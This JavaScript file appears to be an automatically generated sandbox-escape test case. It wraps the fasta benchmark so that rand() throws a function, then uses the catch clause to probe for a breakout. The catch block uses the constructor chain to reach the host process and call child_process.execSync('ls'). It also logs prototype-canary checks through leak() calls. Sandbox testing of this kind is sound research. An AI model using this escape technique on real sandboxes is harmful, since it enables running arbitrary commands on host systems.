try {
    var last = 42, A = 3877, C = 29573, M = 139968;
    function rand(max) {
        throw () => {
            return () => {
            };
        };
        last = (last * A + C) % M;
        return max * last / M;
    }
    var ALU = 'GGCCGGGCGCGGTGGCTCACGCCTGTAATCCCAGCACTTTGG' + 'GAGGCCGAGGCGGGCGGATCACCTGAGGTCAGGAGTTCGAGA' + 'CCAGCCTGGCCAACATGGTGAAACCCCGTCTCTACTAAAAAT' + 'ACAAAAATTAGCCGGGCGTGGTGGCGCGCGCCTGTAATCCCA' + 'GCTACTCGGGAGGCTGAGGCAGGAGAATCGCTTGAACCCGGG' + 'AGGCGGAGGTTGCAGTGAGCCGAGATCGCGCCACTGCACTCC' + 'AGCCTGGGCGACAGAGCGAGACTCCGTCTCAAAAA';
    var IUB = {
        a: 0.27,
        c: 0.12,
        g: 0.12,
        t: 0.27,
        B: 0.02,
        D: 0.02,
        H: 0.02,
        K: 0.02,
        M: 0.02,
        N: 0.02,
        R: 0.02,
        S: 0.02,
        V: 0.02,
        W: 0.02,
        Y: 0.02
    };
    var HomoSap = {
        a: 0.302954942668,
        c: 0.1979883004921,
        g: 0.1975473066391,
        t: 0.3015094502008
    };
    function makeCumulative(table) {
        var last = null;
        for (var c in table) {
            if (last)
                table[c] += table[last];
            last = c;
        }
    }
    function fastaRepeat(n, seq) {
        var seqi = 0, lenOut = 60;
        while (n > 0) {
            if (n < lenOut)
                lenOut = n;
            if (seqi + lenOut < seq.length) {
                ret = seq.substring(seqi, seqi + lenOut);
                seqi += lenOut;
            } else {
                var s = seq.substring(seqi);
                seqi = lenOut - s.length;
                ret = s + seq.substring(0, seqi);
            }
            n -= lenOut;
        }
    }
    function fastaRandom(n, table) {
        var line = new Array(60);
        makeCumulative(table);
        while (n > 0) {
            if (n < line.length)
                line = new Array(n);
            for (var i = 0; i < line.length; i++) {
                var r = rand(1);
                for (var c in table) {
                    if (r < table[c]) {
                        line[i] = c;
                        break;
                    }
                }
            }
            ret = line.join('');
            n -= line.length;
        }
    }
    var ret;
    var count = 7;
    ret = fastaRepeat(2 * count * 100000, ALU);
    ret = fastaRandom(3 * count * 1000, IUB);
    ret = fastaRandom(5 * count * 1000, HomoSap);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}